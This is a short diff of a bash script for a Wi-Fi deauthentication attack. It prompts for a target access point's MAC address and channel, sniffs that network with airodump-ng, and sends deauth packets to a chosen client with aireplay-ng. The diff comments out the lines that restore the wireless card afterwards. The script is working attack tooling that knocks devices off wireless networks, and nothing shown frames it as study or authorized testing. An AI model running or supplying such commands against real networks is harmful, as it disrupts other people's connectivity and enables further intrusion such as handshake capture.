@@ -24,7 +24,7 @@ read host_mac
 echo "What is the target host's channel?"				# Enter the target host's MAC address
 read ch
 
-airodump-ng --channel $ch --bssid $host_mac wlan1			# Sniff traffic just on the target network
+airodump-ng --channel $ch --bssid $host_mac wlan1 			# Sniff traffic just on the target network
 
 echo "What is the target client's MAC address?"				# Enter the target client's MAC address
 read client_mac
@@ -34,6 +34,6 @@ read packets
 
 aireplay-ng --deauth $packets -a $host_mac -c $client_mac wlan1		# Aireplay sends the deauth packets to the host and client
 
-ifconfig wlan1 down							# Bring the network interface down
-iwconfig wlan1 mode managed						# Put the wifi card back into managed mode
-ifconfig wlan1 up							# Bring the network interface back up
+#ifconfig wlan1 down							# Bring the network interface down
+#iwconfig wlan1 mode managed						# Put the wifi card back into managed mode
+#ifconfig wlan1 up							# Bring the network interface back up
